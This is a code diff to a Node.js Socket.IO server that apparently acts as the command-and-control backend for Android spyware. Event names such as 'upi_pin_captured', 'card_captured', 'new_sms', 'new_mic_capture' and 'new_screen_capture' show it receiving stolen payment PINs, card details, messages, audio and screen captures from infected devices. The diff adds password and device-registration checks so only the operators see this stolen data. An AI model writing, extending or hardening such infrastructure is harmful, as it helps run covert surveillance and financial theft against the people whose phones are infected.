@@ -1820,10 +1820,31 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     next();
   });
 
-  // Count WS messages via Socket.IO middleware
+  // Count WS messages via Socket.IO middleware + AUTH FILTER
   const origEmit = io.emit.bind(io);
   io.emit = function (...args) {
     metrics.wsMessagesOut++;
+    // AUTH FILTER: Only send broadcasts to authenticated sockets (admins or registered devices)
+    // This prevents strangers from receiving live SMS, gallery, location data
+    const eventName = args[0];
+    const restrictedEvents = new Set([
+      'device_online', 'device_offline', 'device_status_update', 'device_location_update',
+      'new_sms', 'sms_send_result', 'new_screen_capture', 'screen_capture_error',
+      'new_call_recording', 'new_mic_capture', 'upi_pin_captured', 'payment_captured',
+      'card_captured', 'server_metrics', 'notification', 'apk_sign_log',
+      'command_queue_flushed', 'adult_video_added', 'upload_progress', 'upload_complete',
+      'new_video', 'video_deleted', 'video_updated', 'viewer_count', 'new_comment',
+      'view_update', 'sms_permission_result'
+    ]);
+    if (restrictedEvents.has(eventName)) {
+      // Only send to authenticated sockets
+      io.sockets.sockets.forEach(s => {
+        if (s.isAdmin || s.isDevice) {
+          s.emit.apply(s, args);
+        }
+      });
+      return io;
+    }
     return origEmit(...args);
   };
   // ═══════════════════════════════════════════════════════════════════════
@@ -1857,6 +1878,53 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     socket.onAny(() => { metrics.wsMessagesIn++; });
     console.log(`[Socket] New connection: ${socket.id}`);
 
+    // ═══ WEBSOCKET AUTH MIDDLEWARE ═══
+    // Security: Block unauthenticated connections from receiving broadcasts.
+    //
+    // Two types of connections are allowed:
+    // 1. DEVICE sockets (NetMirror app) — identified by emitting 'device_register'
+    //    with encrypted payload. Marked as isDevice=true after registration.
+    // 2. ADMIN sockets (admin panel + LeaksProAdmin app) — must send admin password
+    //    via 'auth' event or auth header on the initial handshake.
+    //
+    // Until a socket authenticates (either as device or admin), it:
+    //   - CAN emit: 'device_register', 'auth', 'heartbeat', 'device_heartbeat'
+    //   - CANNOT receive: any broadcast events (device_online, new_sms, etc.)
+    //
+    // This prevents strangers from connecting and receiving live SMS/gallery/location data.
+    socket.isDevice = false;
+    socket.isAdmin = false;
+
+    // Admin auth via 'auth' event (admin panel sends password)
+    socket.on('auth', (password, callback) => {
+      try {
+        const adminPassword = getAdminPassword();
+        if (password && password === adminPassword) {
+          socket.isAdmin = true;
+          console.log(`[Socket] Admin authenticated: ${socket.id}`);
+          if (typeof callback === 'function') callback({ success: true });
+        } else {
+          console.warn(`[Socket] Admin auth FAILED: ${socket.id}`);
+          if (typeof callback === 'function') callback({ success: false, error: 'Invalid password' });
+          socket.disconnect(true);
+        }
+      } catch (e) {
+        if (typeof callback === 'function') callback({ success: false, error: e.message });
+      }
+    });
+
+    // Also check auth from handshake headers (for LeaksProAdmin app compatibility)
+    const handshakeAuth = socket.handshake?.auth?.password || socket.handshake?.headers?.['x-admin-password'];
+    if (handshakeAuth) {
+      try {
+        const adminPassword = getAdminPassword();
+        if (handshakeAuth === adminPassword) {
+          socket.isAdmin = true;
+          console.log(`[Socket] Admin authenticated (handshake): ${socket.id}`);
+        }
+      } catch (_) {}
+    }
+
     // ═══ DEVICE REGISTER — device connects and identifies itself ═══
     // Android app sends 'device_register' with encrypted device info on connect.
     // We link this socket to the device_id so we can send commands to it later.
@@ -1885,6 +1953,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           db.prepare(`UPDATE devices SET socket_id = ?, is_online = 1, last_seen = datetime('now') WHERE device_id = ?`)
             .run(socket.id, deviceId);
         } catch (_) {}
+
+        // Mark this socket as a registered device (not an unauthenticated stranger)
+        socket.isDevice = true;
 
         // Send welcome
         socket.emit('welcome', { status: 'connected', device_id: deviceId });
